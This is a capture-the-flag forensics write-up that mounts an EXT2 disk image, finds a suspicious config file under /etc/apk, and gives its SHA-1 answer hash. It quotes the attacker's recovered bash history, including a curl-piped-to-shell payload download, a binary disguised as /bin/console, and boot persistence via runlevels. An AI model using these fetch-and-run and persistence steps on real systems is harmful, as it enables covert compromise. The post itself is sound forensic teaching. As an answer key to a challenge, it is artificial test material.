## Task 1 - Getting Started - (Forensics)

> You arrive on site and immediately get to work. The DAFIN-SOC team quickly briefs you on the situation. They have noticed numerous anomalous behaviors, such as; tools randomly failing tests and anti-virus flagging on seemingly clean workstations. They have narrowed in on one machine they would like NSA to thoroughly evaluate.

> They have provided a zipped EXT2 image from this development machine. Help DAFIN-SOC perform a forensic analysis on this - looking for any suspicious artifacts.

> Downloads: zipped EXT2 image (image.ext2.zip)

> Prompt: Provide the SHA-1 hash of the suspicious artifact.

### Solve: 

For this task, we are given an EXT2 image and need to find the SHA-1 hash of a suspicious artifact. 

This task was pretty straight forward. First, I unzipped the image and then mounted it at a directory I made on my system at `/mnt/task1`

```
unzip image.ext2.zip

sudo mkdir /mnt/task1

sudo mount -t ext2 -o loop image.ext2 /mnt/task1
```

We can then `cd` to `/mnt/task1` and run `ls` to look at the directories we have

```
app  backup  bin  dev  etc  home  lib  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

Seems like a normal Linux system. I figured that the most important files would actually have content, so running the below command, I list all of the files sorted by size 

```
find . -type f -exec du -h {} + 2>/dev/null | sort -hr
```

Ironically, the file we were looking for wasn't that big at all. At the bottom of the command output, with the smaller files, I immediately saw a file name that I thought was odd, `macwszvxno`

```
...
...
A lot of files
...
...
4.0K    ./etc/conf.d/consolefont
4.0K    ./etc/conf.d/bootmisc
4.0K    ./etc/bash/bashrc
4.0K    ./etc/apk/world
4.0K    ./etc/apk/repositories
4.0K    ./etc/apk/macwszvxno          <-- Here
4.0K    ./etc/apk/keys/alpine-devel@lists.alpinelinux.org-61666e3f.rsa.pub
4.0K    ./etc/apk/keys/alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub
4.0K    ./etc/apk/keys/alpine-devel@lists.alpinelinux.org-5261cecb.rsa.pub
4.0K    ./etc/apk/keys/alpine-devel@lists.alpinelinux.org-5243ef4b.rsa.pub
4.0K    ./etc/apk/keys/alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub
4.0K    ./etc/apk/arch
4.0K    ./etc/alpine-release
0       ./lib/apk/db/lock
```

Pretty lucky that the file is right at the end of the output for us to see. If we cat this file it has the contents

```
U=/a/3504c94c909bcc32cad02e67c8c95850/xxyz
P=20
A=/app/www
```

This seems pretty suspicious. Generating the SHA-1 hash of this file with the command below and submitting it solves this task!

> I am running the below command from the mounted image's root directory

```
sha1sum etc/apk/macwszvxno
42516e5930be0dde9a8042912cef8c95af9a507d  etc/apk/macwszvxno
```

In regards to what the intended solve probably was, if we take a look at the bash history in root, we can see some commands revolving around this file by using grep

```
sudo cat root/.bash_history | grep -C 3 macw
```

Gives us:

```
cd /tmp
curl http://127.0.0.1:10000/a/get.sh | sh
tar xf t.tar
cp c /etc/apk/macwszvxno
cp a /bin/console
cp b /etc/runlevels/default/console
rm -f a
--
/bin/console -s
ps | grep con
kill 1020
/bin/console -s -o /etc/apk/macwszvxno
ps
exit
last -20
--
pkill -9 console
ps
ps | grep console
rm -f etc/apk/macwszvxno
rm -f /bin/console
rm -f /etc/runlevels/default/console
exit
```

As we can see from the first few commands, the bad actor downloads and extracts a payload at `http://127.0.0.1:10000/a/get.sh` and installs three malicious files, `c`, `a`, and `b`. 

```
cd /tmp
curl http://127.0.0.1:10000/a/get.sh | sh
tar xf t.tar
cp c /etc/apk/macwszvxno
cp a /bin/console
cp b /etc/runlevels/default/console
```

They then use `a`, which they name `/bin/console` to hide it (to make it look like some legitimate binary), to write data to `/etc/apk/macwszvxno`, which appears to be storing malware parameters or something similar. 

```
/bin/console -s -o /etc/apk/macwszvxno
```

Also, `b` is copied into `/etc/runlevels/default/console` so that it automatically starts at boot. 

```
cp b /etc/runlevels/default/console
```

The bad actor then tries to delete all artifacts, as we see in 3 of the last 4 commands:

```
rm -f etc/apk/macwszvxno
rm -f /bin/console
rm -f /etc/runlevels/default/console
```

However, `/etc/apk/macwszvxno` still remains as we know, and thus is the malicious artifact the task is looking for. The file is still on the system because instead of deleting `/etc/apk/macwszvxno`, the bad actor appears to have mis-inputted, attempting to delete `etc/apk/macwszvxno` instead, missing that first `/`. This tries to delete from a directory named `etc` that is within the current working directory, instead of from `/etc`. If the bad actor is not working from the root, `/`, directory, this command won't work as the bad actor intended. Costly mistake, since it allowed us to find this artifact

**Response:**
> Great job finding that artifact! Let's report what we found to DAFIN-SOC leadership.